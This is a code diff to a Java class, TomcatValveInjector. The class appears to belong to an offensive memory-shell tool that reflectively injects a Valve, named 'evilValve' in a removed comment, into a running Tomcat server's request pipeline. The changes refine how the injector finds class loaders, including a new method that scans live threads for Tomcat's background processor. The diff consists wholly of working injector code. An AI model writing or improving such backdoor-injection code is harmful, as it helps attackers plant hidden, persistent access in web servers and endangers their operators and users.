@@ -97,10 +97,7 @@ public class TomcatValveInjector {
     @SuppressWarnings("all")
     private Object getValve(Object context) {
         Object valve = null;
-        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
-        if (classLoader == null) {
-            classLoader = context.getClass().getClassLoader();
-        }
+        ClassLoader classLoader = context.getClass().getClassLoader();
         try {
             valve = classLoader.loadClass(getClassName()).newInstance();
         } catch (Exception e) {
@@ -163,16 +160,11 @@ public class TomcatValveInjector {
             return;
         }
         try {
-            Class ValveClass;
-            try {
-                ValveClass = Thread.currentThread().getContextClassLoader().loadClass("org.apache.catalina.Valve");
-            } catch (Exception e) {
-                ValveClass = context.getClass().getClassLoader().loadClass("org.apache.catalina.Valve");
-            }
+            Class valveClass;
+            String valveClassName = "org.apache.catalina.Valve";
+            valveClass = context.getClass().getClassLoader().loadClass(valveClassName);
             Object obj = invokeMethod(context, "getPipeline");
-            // Object obj = STANDARD_CONTEXT.getClass().getMethod("getPipeline").invoke(STANDARD_CONTEXT);
-            // obj.getClass().getMethod("addValve", Class.forName("org.apache.catalina.Valve")).invoke(obj,evilValve);
-            invokeMethod(obj, "addValve", new Class[]{ValveClass}, new Object[]{valve});
+            invokeMethod(obj, "addValve", new Class[]{valveClass}, new Object[]{valve});
         } catch (Exception e) {
             e.printStackTrace();
         }
@@ -245,5 +237,18 @@ public class TomcatValveInjector {
                 throw new RuntimeException(e.getMessage());
             }
         }
+    }
+
+    public ClassLoader getCatalinaLoader() throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
+        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads");
+        ClassLoader catalinaLoader = null;
+        for (Thread thread : threads) {
+            // 适配 v5 的 Class Loader 问题
+            if (thread.getName().contains("ContainerBackgroundProcessor")) {
+                catalinaLoader = thread.getContextClassLoader();
+                break;
+            }
+        }
+        return catalinaLoader;
     }
 }
